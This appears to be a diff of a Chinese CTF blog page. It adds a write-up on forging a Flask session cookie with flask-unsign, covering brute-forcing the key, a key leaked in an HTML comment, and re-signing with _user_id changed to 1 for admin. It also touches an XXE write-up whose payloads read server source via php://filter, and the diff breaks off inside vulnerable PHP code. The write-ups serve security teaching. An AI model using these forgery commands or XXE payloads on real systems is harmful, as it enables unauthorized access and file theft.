@@ -2257,6 +2257,8 @@
       
         
       
+        
+      
     
     
     
@@ -2986,6 +2988,36 @@
   
   
     <li class="md-nav__item">
+      <a href="../%E4%BC%9A%E8%AF%9D%E4%BC%AA%E9%80%A0/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    会话伪造
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
       <a href="../%E4%BC%9A%E8%AF%9D%E5%AE%89%E5%85%A8/" class="md-nav__link">
         
   
@@ -3610,6 +3642,159 @@
     <div class="md-post__meta md-meta">
       <ul class="md-meta__list">
         <li class="md-meta__item">
+          <time datetime="2026-11-21 20:45:00+00:00">2026-11-21</time></li>
+        
+          <li class="md-meta__item">
+            分类于
+            
+              <a href="./" class="md-meta__link">Web</a>, 
+              <a href="../%E4%BC%9A%E8%AF%9D%E4%BC%AA%E9%80%A0/" class="md-meta__link">会话伪造</a></li>
+        
+        
+          
+          <li class="md-meta__item">
+            
+              需要 2 分钟阅读时间
+            
+          </li>
+        
+        
+      </ul>
+      
+    </div>
+  </header>
+  <div class="md-post__content md-typeset">
+    <h2 id="nssround13-basic-flaskjwt"><a class="toclink" href="../../nssround13-flask-jwt/">[NSSRound#13 Basic] flask?jwt? — 先分清它是谁</a></h2>
+<blockquote>
+<p><strong>题目类型</strong>：Flask session 伪造（签名密钥泄露）</p>
+<p><strong>Flag</strong>：<code>NSSCTF{d7cbf6c8-fe25-4fe9-a1ea-18248a2e7262}</code></p>
+</blockquote>
+<hr />
+<h3 id="_1"><a class="toclink" href="../../nssround13-flask-jwt/#_1">题目概述</a></h3>
+<p><strong>题名本身就是提示：<code>flask?jwt?</code>——它在问你，这个 session 到底是 Flask 的还是 JWT 的。</strong></p>
+<p><strong>这两者长得像（都是一串点分段的 base64），但</strong>处理方式完全不同<strong>：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>JWT             三段，第一段是 {"alg":"HS256",...}
+</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>Flask session   三段或四段，解出来是 {"_fresh":true,...}
+</span></code></pre></div>
+<p><strong>先分辨清楚，再决定用哪套工具——这一步能省掉大量瞎试。</strong></p>
+<hr />
+<h3 id="_2"><a class="toclink" href="../../nssround13-flask-jwt/#_2">解题过程</a></h3>
+<h4 id="step-1-session"><a class="toclink" href="../../nssround13-flask-jwt/#step-1-session">Step 1：注册个账号，看 session</a></h4>
+<p><strong>随便注册、登录，抓包看 cookie：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>session=eyJfZnJlc2giOnRydWUs...
+</span></code></pre></div>
+<p><strong>它是三段式，而且解出来是 Python 字典的键名（<code>_fresh</code>、<code>_user_id</code>）——这是 Flask 的 session，不是 JWT。</strong></p>
+<p><strong>用 flask-unsign 解：</strong></p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="n">flask-unsign</span> <span class="p">-</span><span class="n">-decode</span> <span class="p">-</span><span class="n">-cookie</span> <span class="s2">"&lt;cookie&gt;"</span>
+</span></code></pre></div>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="p">{</span><span class="s1">'_fresh'</span><span class="p">:</span> <span class="kc">True</span><span class="p">,</span>
+</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a> <span class="s1">'_id'</span><span class="p">:</span> <span class="s1">'ae8e9db8fb729eeafed37232050214fccc9622e0659ecd9f43975a2a49ca9e26c0f81ca580bf3fe07a890e68021b5b54fffe0e2bc8cb86a30e503a402acbbd02'</span><span class="p">,</span>
+</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a> <span class="s1">'_user_id'</span><span class="p">:</span> <span class="s1">'2'</span><span class="p">}</span>
+</span></code></pre></div>
+<p><strong>三个键：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>_fresh    这次是不是刚登录的
+</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a>_id       会话 id（Flask-Login 用来绑定会话）
+</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a>_user_id  当前用户编号 ← 要改的就是它
+</span></code></pre></div>
+<h4 id="step-2-flag-admin"><a class="toclink" href="../../nssround13-flask-jwt/#step-2-flag-admin">Step 2：点“获取 flag”，提示不是 admin</a></h4>
+<p><strong>说明后端在判断 <code>_user_id</code> 是不是 1。</strong></p>
+<p><strong>那就把 <code>'2'</code> 改成 <code>'1'</code>。</strong></p>
+<h4 id="step-3"><a class="toclink" href="../../nssround13-flask-jwt/#step-3">Step 3：直接改值没用——它是签名过的</a></h4>
+<p><strong>Flask 的 session 是</strong>签名 cookie<strong>：内容放在客户端，但签名在服务端校验。</strong></p>
+<p><strong>改了内容、签名对不上，服务端直接丢弃整个 session，表现得像“你没登录”。</strong></p>
+<p><strong>所以必须</strong>重新签名<strong>，而这需要 <code>SECRET_KEY</code>。</strong></p>
+<h4 id="step-4"><a class="toclink" href="../../nssround13-flask-jwt/#step-4">Step 4：一边爆破，一边找提示</a></h4>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="n">flask-unsign</span> <span class="p">-</span><span class="n">-unsign</span> <span class="p">-</span><span class="n">-cookie</span> <span class="s2">"&lt;cookie&gt;"</span> <span class="p">-</span><span class="n">-wordlist</span> <span class="n">E</span><span class="p">:\</span><span class="n">dsh</span><span class="p">\</span><span class="n">flask</span><span class="p">\</span><span class="n">rockyou</span><span class="p">.</span><span class="n">txt</span> <span class="p">-</span><span class="n">-no-literal-eval</span>
+</span></code></pre></div>
+<p><strong><code>--no-literal-eval</code> 是必须的</strong>：rockyou 里有纯数字行（比如 <code>123456</code>），默认会被当 Python 字面量解析成整数，然后报 <code>Secret must be a string</code>，爆破直接中断。</p>
+<p><strong>注意这一步是</strong>并行<strong>的——爆破同时去翻页面。</strong></p>
+<p><strong>在“忘记密码”页面的 HTML 源码末尾，看到一行注释：</strong></p>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="cm">&lt;!-- secretkey: th3flaskisfunny --&gt;</span>
+</span></code></pre></div>
+<p><strong>密钥直接写在页面注释里。</strong></p>
+<p><strong><code>Ctrl + C</code> 停掉爆破——不用等了。</strong></p>
+<h4 id="step-5"><a class="toclink" href="../../nssround13-flask-jwt/#step-5">Step 5：用密钥重签</a></h4>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a><span class="n">flask-unsign</span> <span class="p">-</span><span class="n">-sign</span> <span class="p">-</span><span class="n">-cookie</span> <span class="s2">"{'_fresh':True,'_id':'ae8e9db8...503a402acbbd02','_user_id':'1'}"</span> <span class="p">-</span><span class="n">-secret</span> <span class="s2">"th3flaskisfunny"</span>
+</span></code></pre></div>
+<p><strong>三个必须注意的：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>① 整个字典都要写，不能只写 _user_id
+</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a>   _fresh 和 _id 缺了，Flask-Login 认为会话不完整，直接不认
+</span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a>② 值保持字符串：'1' 而不是 1
+</span><span id="__span-30-4"><a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a>③ PowerShell 里用双引号包整块，里面用单引号
+</span></code></pre></div>
+<p><strong>把输出的值替换 cookie，刷新页面再点一次“获取 flag”：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>NSSCTF{d7cbf6c8-fe25-4fe9-a1ea-18248a2e7262}
+</span></code></pre></div>
+<hr />
+<table>
+<thead>
+<tr>
+<th>关键点</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>判断类型</td>
+<td>解第一段：<code>{"alg":...}</code> 是 JWT，<code>{"_fresh":...}</code> 是 Flask</td>
+</tr>
+<tr>
+<td>Flask session</td>
+<td>内容在客户端，签名在服务端，改值必须重签</td>
+</tr>
+<tr>
+<td>三个键</td>
+<td><code>_fresh</code> / <code>_id</code> / <code>_user_id</code>，重签时一个都不能少</td>
+</tr>
+<tr>
+<td>爆破参数</td>
+<td><code>--no-literal-eval</code>（否则数字行会中断爆破）</td>
+</tr>
+<tr>
+<td>密钥来源</td>
+<td>页面 HTML 注释：<code>&lt;!-- secretkey: th3flaskisfunny --&gt;</code></td>
+</tr>
+<tr>
+<td>提权动作</td>
+<td><code>_user_id</code> 从 2 改成 1</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<details class="note">
+<summary>完整流程</summary>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="c"># ① 解码</span>
+</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a><span class="n">flask-unsign</span> <span class="p">-</span><span class="n">-decode</span> <span class="p">-</span><span class="n">-cookie</span> <span class="s2">"&lt;cookie&gt;"</span>
+</span><span id="__span-32-3"><a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a>
+</span><span id="__span-32-4"><a id="__codelineno-32-4" name="__codelineno-32-4" href="#__codelineno-32-4"></a><span class="c"># ② 爆破（可被下面的源码提示中断）</span>
+</span><span id="__span-32-5"><a id="__codelineno-32-5" name="__codelineno-32-5" href="#__codelineno-32-5"></a><span class="n">flask-unsign</span> <span class="p">-</span><span class="n">-unsign</span> <span class="p">-</span><span class="n">-cookie</span> <span class="s2">"&lt;cookie&gt;"</span> <span class="p">-</span><span class="n">-wordlist</span> <span class="n">E</span><span class="p">:\</span><span class="n">dsh</span><span class="p">\</span><span class="n">flask</span><span class="p">\</span><span class="n">rockyou</span><span class="p">.</span><span class="n">txt</span> <span class="p">-</span><span class="n">-no-literal-eval</span>
+</span><span id="__span-32-6"><a id="__codelineno-32-6" name="__codelineno-32-6" href="#__codelineno-32-6"></a>
+</span><span id="__span-32-7"><a id="__codelineno-32-7" name="__codelineno-32-7" href="#__codelineno-32-7"></a><span class="c"># ③ 用泄露的密钥重签</span>
+</span><span id="__span-32-8"><a id="__codelineno-32-8" name="__codelineno-32-8" href="#__codelineno-32-8"></a><span class="n">flask-unsign</span> <span class="p">-</span><span class="n">-sign</span> <span class="p">-</span><span class="n">-cookie</span> <span class="s2">"{'_fresh':True,'_id':'ae8e...','_user_id':'1'}"</span> <span class="p">-</span><span class="n">-secret</span> <span class="s2">"th3flaskisfunny"</span>
+</span></code></pre></div>
+</details>
+<details class="note">
+<summary>这题踩的坑</summary>
+<p><strong>① 把 Flask session 当 JWT 打</strong></p>
+<p><strong>jwt_tool 会直接报 <code>Not 3 parts</code>（四段）或解析出一堆 <code>_fresh</code> 之类的键。</strong>两个工具不通用，先判断再选。</p>
+<p><strong>② 在 rockyou 上干等</strong></p>
+<p>1400 万行要跑很久。<strong><code>--no-literal-eval</code> 不加还会直接崩。</strong>正确做法是<strong>同时翻页面</strong>——这题的密钥就在注释里。</p>
+<p><strong>③ 只写 <code>_user_id</code> 去签名</strong></p>
+<p>Flask-Login 需要 <code>_fresh</code> 和 <code>_id</code>，缺一个就判会话无效。<strong>重签是“整块重写”，不是“打补丁”。</strong></p>
+<p><strong>④ 写成 <code>1</code> 而不是 <code>'1'</code></strong></p>
+<p>类型不一致，比较可能失败。<strong>原来是什么类型就保持什么类型。</strong></p>
+</details>
+    
+    
+  </div>
+</article>
+      
+        <article class="md-post md-post--excerpt">
+  <header class="md-post__header">
+    
+    <div class="md-post__meta md-meta">
+      <ul class="md-meta__list">
+        <li class="md-meta__item">
           <time datetime="2026-11-21 20:15:00+00:00">2026-11-21</time></li>
         
           <li class="md-meta__item">
@@ -3645,66 +3830,66 @@
 <h3 id="_2"><a class="toclink" href="../../nctf2019-fake-xml-cookbook/#_2">解题过程</a></h3>
 <h4 id="step-1-xml"><a class="toclink" href="../../nctf2019-fake-xml-cookbook/#step-1-xml">Step 1：确认请求体是 XML</a></h4>
 <p><strong>页面源码里翻到登录逻辑，提交方式很明确：</strong></p>
-<div class="language-javascript highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a><span class="kd">var</span><span class="w"> </span><span class="nx">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"&lt;user&gt;&lt;username&gt;"</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">username</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">"&lt;/username&gt;&lt;password&gt;"</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">password</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">"&lt;/password&gt;&lt;/user&gt;"</span><span class="p">;</span>
-</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a><span class="nx">$</span><span class="p">.</span><span class="nx">ajax</span><span class="p">({</span>
-</span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a><span class="w">  </span><span class="nx">type</span><span class="o">:</span><span class="w"> </span><span class="s2">"post"</span><span class="p">,</span>
-</span><span id="__span-30-4"><a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a><span class="w">  </span><span class="nx">url</span><span class="o">:</span><span class="w"> </span><span class="s2">"doLogin.php"</span><span class="p">,</span>
-</span><span id="__span-30-5"><a id="__codelineno-30-5" name="__codelineno-30-5" href="#__codelineno-30-5"></a><span class="w">  </span><span class="nx">contentType</span><span class="o">:</span><span class="w"> </span><span class="s2">"application/xml"</span><span class="p">,</span>
-</span><span id="__span-30-6"><a id="__codelineno-30-6" name="__codelineno-30-6" href="#__codelineno-30-6"></a><span class="w">  </span><span class="nx">data</span><span class="o">:</span><span class="w"> </span><span class="nx">data</span>
-</span><span id="__span-30-7"><a id="__codelineno-30-7" name="__codelineno-30-7" href="#__codelineno-30-7"></a><span class="p">})</span>
+<div class="language-javascript highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="kd">var</span><span class="w"> </span><span class="nx">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"&lt;user&gt;&lt;username&gt;"</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">username</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">"&lt;/username&gt;&lt;password&gt;"</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">password</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">"&lt;/password&gt;&lt;/user&gt;"</span><span class="p">;</span>
+</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a><span class="nx">$</span><span class="p">.</span><span class="nx">ajax</span><span class="p">({</span>
+</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a><span class="w">  </span><span class="nx">type</span><span class="o">:</span><span class="w"> </span><span class="s2">"post"</span><span class="p">,</span>
+</span><span id="__span-20-4"><a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a><span class="w">  </span><span class="nx">url</span><span class="o">:</span><span class="w"> </span><span class="s2">"doLogin.php"</span><span class="p">,</span>
+</span><span id="__span-20-5"><a id="__codelineno-20-5" name="__codelineno-20-5" href="#__codelineno-20-5"></a><span class="w">  </span><span class="nx">contentType</span><span class="o">:</span><span class="w"> </span><span class="s2">"application/xml"</span><span class="p">,</span>
+</span><span id="__span-20-6"><a id="__codelineno-20-6" name="__codelineno-20-6" href="#__codelineno-20-6"></a><span class="w">  </span><span class="nx">data</span><span class="o">:</span><span class="w"> </span><span class="nx">data</span>
+</span><span id="__span-20-7"><a id="__codelineno-20-7" name="__codelineno-20-7" href="#__codelineno-20-7"></a><span class="p">})</span>
 </span></code></pre></div>
 <p><strong>三件事对上了：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>请求体是 XML           ← 拼接出来的标签结构
-</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a>Content-Type 是 xml    ← application/xml
-</span><span id="__span-31-3"><a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a>数据直接拼进去          ← 没有转义
+<div class="language-text highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>请求体是 XML           ← 拼接出来的标签结构
+</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>Content-Type 是 xml    ← application/xml
+</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a>数据直接拼进去          ← 没有转义
 </span></code></pre></div>
 <p><strong>XML + 可控输入 = 先试 XXE。</strong></p>
 <h4 id="step-2"><a class="toclink" href="../../nctf2019-fake-xml-cookbook/#step-2">Step 2：加声明和引用，验证漏洞</a></h4>
 <p><strong>抓包，把请求体改成：</strong></p>
-<div class="language-xml highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="cp">&lt;!DOCTYPE user [ &lt;!ENTITY x "12"&gt;</span><span class="w"> </span>]&gt;
-</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a><span class="nt">&lt;user&gt;</span>
-</span><span id="__span-32-3"><a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a><span class="w">  </span><span class="nt">&lt;username&gt;</span><span class="ni">&amp;x;</span><span class="nt">&lt;/username&gt;</span>
-</span><span id="__span-32-4"><a id="__codelineno-32-4" name="__codelineno-32-4" href="#__codelineno-32-4"></a><span class="w">  </span><span class="nt">&lt;password&gt;</span>1<span class="nt">&lt;/password&gt;</span>
-</span><span id="__span-32-5"><a id="__codelineno-32-5" name="__codelineno-32-5" href="#__codelineno-32-5"></a><span class="nt">&lt;/user&gt;</span>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="cp">&lt;!DOCTYPE user [ &lt;!ENTITY x "12"&gt;</span><span class="w"> </span>]&gt;
+</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a><span class="nt">&lt;user&gt;</span>
+</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a><span class="w">  </span><span class="nt">&lt;username&gt;</span><span class="ni">&amp;x;</span><span class="nt">&lt;/username&gt;</span>
+</span><span id="__span-22-4"><a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a><span class="w">  </span><span class="nt">&lt;password&gt;</span>1<span class="nt">&lt;/password&gt;</span>
+</span><span id="__span-22-5"><a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a><span class="nt">&lt;/user&gt;</span>
 </span></code></pre></div>
 <p><strong>返回里 <code>msg</code> 变成了 <code>12</code>——说明实体被解析了，DTD 是生效的。</strong></p>
 <p><strong>第一步验证完成：这里能定义实体，也就能定义</strong>外部<strong>实体。</strong></p>
 <h4 id="step-3"><a class="toclink" href="../../nctf2019-fake-xml-cookbook/#step-3">Step 3：先读源码，确认为什么登录没用</a></h4>
 <p><strong>响应头带着 <code>PHP</code>，所以可以用 PHP 的伪协议。</strong></p>
 <p><strong>但要注意一个前提：</strong>外部实体读的是“文件原文”，<strong>不会经过 PHP 解析</strong>。想读源码就必须先 base64 编码，否则 <code>&lt;?php ... ?&gt;</code> 会被当成 XML 标签吞掉。**</p>
-<div class="language-xml highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a><span class="cp">&lt;!DOCTYPE user [ &lt;!ENTITY x SYSTEM "php://filter/read=convert.base64-encode/resource=doLogin.php"&gt;</span><span class="w"> </span>]&gt;
-</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a><span class="nt">&lt;user&gt;</span>
-</span><span id="__span-33-3"><a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a><span class="w">  </span><span class="nt">&lt;username&gt;</span><span class="ni">&amp;x;</span><span class="nt">&lt;/username&gt;</span>
-</span><span id="__span-33-4"><a id="__codelineno-33-4" name="__codelineno-33-4" href="#__codelineno-33-4"></a><span class="w">  </span><span class="nt">&lt;password&gt;</span>1<span class="nt">&lt;/password&gt;</span>
-</span><span id="__span-33-5"><a id="__codelineno-33-5" name="__codelineno-33-5" href="#__codelineno-33-5"></a><span class="nt">&lt;/user&gt;</span>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="cp">&lt;!DOCTYPE user [ &lt;!ENTITY x SYSTEM "php://filter/read=convert.base64-encode/resource=doLogin.php"&gt;</span><span class="w"> </span>]&gt;
+</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a><span class="nt">&lt;user&gt;</span>
+</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a><span class="w">  </span><span class="nt">&lt;username&gt;</span><span class="ni">&amp;x;</span><span class="nt">&lt;/username&gt;</span>
+</span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a><span class="w">  </span><span class="nt">&lt;password&gt;</span>1<span class="nt">&lt;/password&gt;</span>
+</span><span id="__span-23-5"><a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a><span class="nt">&lt;/user&gt;</span>
 </span></code></pre></div>
 <p><strong>把返回的 base64 解出来，就是 <code>doLogin.php</code> 的源码：</strong></p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a><span class="x">$USERNAME = 'admin';</span>
-</span><span id="__span-34-2"><a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a><span class="x">$PASSWORD = '024b87931a03f738fff6693ce0a78c88';</span>
-</span><span id="__span-34-3"><a id="__codelineno-34-3" name="__codelineno-34-3" href="#__codelineno-34-3"></a><span class="x">$result = null;</span>
-</span><span id="__span-34-4"><a id="__codelineno-34-4" name="__codelineno-34-4" href="#__codelineno-34-4"></a>
-</span><span id="__span-34-5"><a id="__codelineno-34-5" name="__codelineno-34-5" href="#__codelineno-34-5"></a><span class="x">libxml_disable_entity_loader(false);</span>
-</span><span id="__span-34-6"><a id="__codelineno-34-6" name="__codelineno-34-6" href="#__codelineno-34-6"></a><span class="x">$xmlfile = file_get_contents('php://input');</span>
-</span><span id="__span-34-7"><a id="__codelineno-34-7" name="__codelineno-34-7" href="#__codelineno-34-7"></a>
-</span><span id="__span-34-8"><a id="__codelineno-34-8" name="__codelineno-34-8" href="#__codelineno-34-8"></a><span class="x">try {</span>
-</span><span id="__span-34-9"><a id="__codelineno-34-9" name="__codelineno-34-9" href="#__codelineno-34-9"></a><span class="x">    $dom = new DOMDocument();</span>
-</span><span id="__span-34-10"><a id="__codelineno-34-10" name="__codelineno-34-10" href="#__codelineno-34-10"></a><span class="x">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span>
-</span><span id="__span-34-11"><a id="__codelineno-34-11" name="__codelineno-34-11" href="#__codelineno-34-11"></a><span class="x">    $creds = simplexml_import_dom($dom);</span>
-</span><span id="__span-34-12"><a id="__codelineno-34-12" name="__codelineno-34-12" href="#__codelineno-34-12"></a><span class="x">    $username = $creds-&gt;username;</span>
-</span><span id="__span-34-13"><a id="__codelineno-34-13" name="__codelineno-34-13" href="#__codelineno-34-13"></a><span class="x">    $password = $creds-&gt;password;</span>
-</span><span id="__span-34-14"><a id="__codelineno-34-14" name="__codelineno-34-14" href="#__codelineno-34-14"></a>
-</span><span id="__span-34-15"><a id="__codelineno-34-15" name="__codelineno-34-15" href="#__codelineno-34-15"></a><span class="x">    if ($username == $USERNAME &amp;&amp; $password == $PASSWORD) {</span>
-</span><span id="__span-34-16"><a id="__codelineno-34-16" name="__codelineno-34-16" href="#__codelineno-34-16"></a><span class="x">        $result = sprintf("&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;", 1, $username);</span>
-</span><span id="__span-34-17"><a id="__codelineno-34-17" name="__codelineno-34-17" href="#__codelineno-34-17"></a><span class="x">    } else {</span>
-</span><span id="__span-34-18"><a id="__codelineno-34-18" name="__codelineno-34-18" href="#__codelineno-34-18"></a><span class="x">        $result = sprintf("&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;", 0, $username);</span>
-</span><span id="__span-34-19"><a id="__codelineno-34-19" name="__codelineno-34-19" href="#__codelineno-34-19"></a><span class="x">    }</span>
-</span><span id="__span-34-20"><a id="__codelineno-34-20" name="__codelineno-34-20" href="#__codelineno-34-20"></a><span class="x">} catch (Exception $e) {</span>
-</span><span id="__span-34-21"><a id="__codelineno-34-21" name="__codelineno-34-21" href="#__codelineno-34-21"></a><span class="x">    $result = sprintf("&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;", 3, $e-&gt;getMessage());</span>
-</span><span id="__span-34-22"><a id="__codelineno-34-22" name="__codelineno-34-22" href="#__codelineno-34-22"></a><span class="x">}</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="x">$USERNAME = 'admin';</span>
+</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a><span class="x">$PASSWORD = '024b87931a03f738fff6693ce0a78c88';</span>
+</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a><span class="x">$result = null;</span>
+</span><span id="__span-24-4"><a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a>
+</span><span id="__span-24-5"><a id="__codelineno-24-5" name="__codelineno-24-5" href="#__codelineno-24-5"></a><span class="x">libxml_disable_entity_loader(false);</span>
+</span><span id="__span-24-6"><a id="__codelineno-24-6" name="__codelineno-24-6" href="#__codelineno-24-6"></a><span class="x">$xmlfile = file_get_contents('php://input');</span>
+</span><span id="__span-24-7"><a id="__codelineno-24-7" name="__codelineno-24-7" href="#__codelineno-24-7"></a>
+</span><span id="__span-24-8"><a id="__codelineno-24-8" name="__codelineno-24-8" href="#__codelineno-24-8"></a><span class="x">try {</span>
+</span><span id="__span-24-9"><a id="__codelineno-24-9" name="__codelineno-24-9" href="#__codelineno-24-9"></a><span class="x">    $dom = new DOMDocument();</span>
+</span><span id="__span-24-10"><a id="__codelineno-24-10" name="__codelineno-24-10" href="#__codelineno-24-10"></a><span class="x">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span>
+</span><span id="__span-24-11"><a id="__codelineno-24-11" name="__codelineno-24-11" href="#__codelineno-24-11"></a><span class="x">    $creds = simplexml_import_dom($dom);</span>
+</span><span id="__span-24-12"><a id="__codelineno-24-12" name="__codelineno-24-12" href="#__codelineno-24-12"></a><span class="x">    $username = $creds-&gt;username;</span>
+</span><span id="__span-24-13"><a id="__codelineno-24-13" name="__codelineno-24-13" href="#__codelineno-24-13"></a><span class="x">    $password = $creds-&gt;password;</span>
+</span><span id="__span-24-14"><a id="__codelineno-24-14" name="__codelineno-24-14" href="#__codelineno-24-14"></a>
+</span><span id="__span-24-15"><a id="__codelineno-24-15" name="__codelineno-24-15" href="#__codelineno-24-15"></a><span class="x">    if ($username == $USERNAME &amp;&amp; $password == $PASSWORD) {</span>
